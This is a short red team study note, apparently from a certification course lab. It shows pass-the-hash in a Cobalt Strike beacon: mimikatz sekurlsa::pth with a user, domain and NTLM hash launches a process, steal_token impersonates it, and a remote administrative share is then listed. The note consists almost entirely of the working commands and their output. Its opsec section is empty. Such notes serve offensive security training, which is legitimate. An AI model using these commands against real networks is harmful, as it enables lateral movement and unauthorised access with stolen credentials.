
For pass-the-hash, we can simply start an arbitrary process and steal its token manually.

```
beacon> mimikatz sekurlsa::pth /user:"jking" /domain:"DEV" /ntlm:59fc0f884922b4ce376051134c71e22c /run:notepad.exe

user	: jking
domain	: DEV
program	: notepad.exe
impers.	: no
NTLM	: 59fc0f884922b4ce376051134c71e22c
  |  PID  17896
  |  TID  11384
  |  LSA Process is now R/W
  |  LUID 0 ; 8586493 (00000000:008304fd)
  \_ msv1_0   - data copy @ 00000129694D4070 : OK !
  \_ kerberos - data copy @ 00000129694CCD28

beacon> steal_token 17896
[+] Impersonated DEV\bfarmer

beacon> ls \\web.dev.cyberbotic.io\c$
[*] Listing: \\web.dev.cyberbotic.io\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     08/15/2022 18:50:13   $Recycle.Bin
          dir     08/10/2022 04:55:17   $WinREAgent
          dir     08/10/2022 05:05:53   Boot
          dir     08/18/2021 23:34:55   Documents and Settings
```


#### ⚠ Opsec




### Properties
---
📆 created   {{29-02-2024}} 11:32
🏷️ tags: #redteam #crto 

---

